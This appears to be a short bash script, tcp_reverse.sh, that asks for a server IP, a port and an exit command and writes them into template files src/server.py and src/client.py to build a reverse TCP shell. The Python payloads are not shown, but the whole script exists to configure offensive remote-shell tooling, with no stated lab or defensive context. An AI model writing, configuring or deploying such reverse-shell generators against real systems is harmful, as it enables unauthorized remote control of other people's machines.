#!/bin/bash
#tcp_reverse.sh
#Author: Willie Cooley
#Description: Takes script takes user input on IP, port #, and an
#     exit command, and generates two python scripts
#     client.py and server.py for creating a reverse tcp shell.

echo "-----------------------------------------------"
echo "          TCP Reverse Shell Script             "
echo "-----------------------------------------------"
echo -n "Enter server IP:   "
read IP
echo -n "Enter server port: "
read port
echo -n "Exit Command:      "
read cmd

sed -i.tmp 's/XXX.XXX.XXX.XXX/'$IP'/g; s/9999/'$port'/g; s/XPLACEX/'$cmd'/g' src/server.py &&
mv src/server.py . && mv src/server.py.tmp src/server.py &&
sed -i.tmp 's/XXX.XXX.XXX.XXX/'$IP'/g; s/9999/'$port'/g; s/XPLACEX/'$cmd'/g' src/client.py &&
mv src/client.py . && mv src/client.py.tmp src/client.py &&
echo " "
echo "Script Generation Successful!"
